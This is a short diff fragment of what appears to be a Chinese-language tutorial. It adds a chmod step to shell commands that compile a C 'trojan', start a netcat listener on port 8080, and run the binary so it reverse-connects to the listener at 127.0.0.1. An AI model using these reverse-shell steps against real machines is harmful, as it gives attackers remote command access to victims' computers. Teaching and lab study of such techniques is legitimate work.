@@ -125,6 +125,7 @@ system(shell_cmd);
 
 ```shell
 >>> gcc -o shelltest system.c #编译c代码
+>>> chmod +x shelltest
 >>> nc -l -p 8080 #本地电脑监听8080端口
 >>>./shelltest 127.0.0.1 8080 ＃目标电脑木马反向连接自己的电脑
 >>> ifconfig #本地电脑执行命令验证结果
